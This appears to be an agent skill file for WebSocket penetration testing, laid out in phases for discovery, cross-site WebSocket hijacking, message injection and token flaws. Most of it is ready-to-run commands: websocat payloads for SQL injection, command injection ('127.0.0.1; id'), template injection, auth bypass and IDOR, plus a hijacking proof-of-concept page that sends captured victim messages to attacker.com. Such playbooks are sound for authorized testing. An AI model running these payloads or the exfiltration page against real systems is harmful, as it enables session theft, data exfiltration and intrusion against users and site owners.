---
name: vuln-websocket
description: "WebSocket security testing — cross-site WebSocket hijacking (CSWSH), message injection, authentication bypass, SQL/NoSQL/command injection via WebSocket messages, privilege escalation via WebSocket. Triggers: 'websocket', 'websocket security', 'cswsh', 'cross-site websocket hijacking', 'websocket injection', 'ws pentest', 'socket.io security', 'websocket exploit'."
---

# WebSocket Security Testing

Test WebSocket endpoints for CSWSH, injection, and authentication issues.

---

## Phase 1: Discovery & Interception

```bash
TARGET="wss://TARGET"
TARGET_HTTP="https://TARGET"

# Find WebSocket endpoints:
curl -s "$TARGET_HTTP" | grep -oE '"wss?://[^"]+"' | sort -u | tee output/ws_endpoints.txt
curl -s "$TARGET_HTTP/static/app.js" | grep -oE '"wss?://[^"]+"' | sort -u

# Check WebSocket upgrade:
curl -s -I -H "Upgrade: websocket" -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  "$TARGET_HTTP/ws" | grep -i "101\|websocket"

# Use websocat to interact:
# apt install websocat
websocat "$TARGET/ws" --no-close -v 2>&1 | head -20

# wscat:
# npm install -g wscat
wscat -c "$TARGET/ws" -x '{"type":"ping"}' 2>&1
```

---

## Phase 2: Cross-Site WebSocket Hijacking (CSWSH)

```bash
TARGET_WS="wss://TARGET/ws"
VICTIM_COOKIE="session=VICTIM_TOKEN"

# Check if Origin header is validated:
# Test with null origin — if connection succeeds, CSWSH possible
websocat --no-close "$TARGET_WS" \
  -H "Origin: null" 2>&1 | head -10

websocat --no-close "$TARGET_WS" \
  -H "Origin: https://evil.com" 2>&1 | head -10

# CSWSH PoC page — victim opens this, attacker receives their WebSocket messages:
cat > output/cswsh_poc.html << 'EOF'
<html>
<script>
var ws = new WebSocket("wss://TARGET/ws");
ws.onopen = function() { ws.send(JSON.stringify({type:"getProfile"})); };
ws.onmessage = function(e) { 
  fetch("https://attacker.com/steal?d=" + encodeURIComponent(e.data)); 
};
</script>
</html>
EOF
```

---

## Phase 3: Message Injection

```bash
TARGET_WS="wss://TARGET/ws"

# Inject SQL via WebSocket message:
websocat "$TARGET_WS" <<< '{"action":"search","query":"test OR 1=1--"}'

# Command injection:
websocat "$TARGET_WS" <<< '{"action":"ping","host":"127.0.0.1; id"}'

# SSTI via WebSocket:
websocat "$TARGET_WS" <<< '{"template":"{{7*7}}"}'

# Auth bypass — send admin action without auth:
websocat "$TARGET_WS" <<< '{"action":"getAdminData","userId":"admin"}'

# IDOR via WebSocket:
websocat "$TARGET_WS" -H "Cookie: session=ATTACKER_SESSION" <<< \
  '{"action":"getMessages","userId":"VICTIM_USER_ID"}'
```

---

## Phase 4: Token/Auth Issues

```bash
TARGET_WS="wss://TARGET/ws"

# Connect without authentication:
websocat "$TARGET_WS" --no-close -v <<< '{"type":"getProfile"}' 2>&1

# Auth token in URL (insecure — logged):
websocat "wss://TARGET/ws?token=VICTIM_TOKEN" <<< '{"type":"getMessages"}'

# Expired token still works:
websocat "$TARGET_WS" -H "Authorization: Bearer EXPIRED_TOKEN" <<< '{"type":"ping"}'
```

---

## Output

Save to `output/`:
- `ws_endpoints.txt` — discovered WebSocket endpoints
- `cswsh_poc.html` — cross-site WebSocket hijacking PoC
- `ws_injection.txt` — successful injection payloads

## Next Phase

→ `vuln-account-takeover` if CSWSH achieves session theft
→ `pentest-report` to document findings
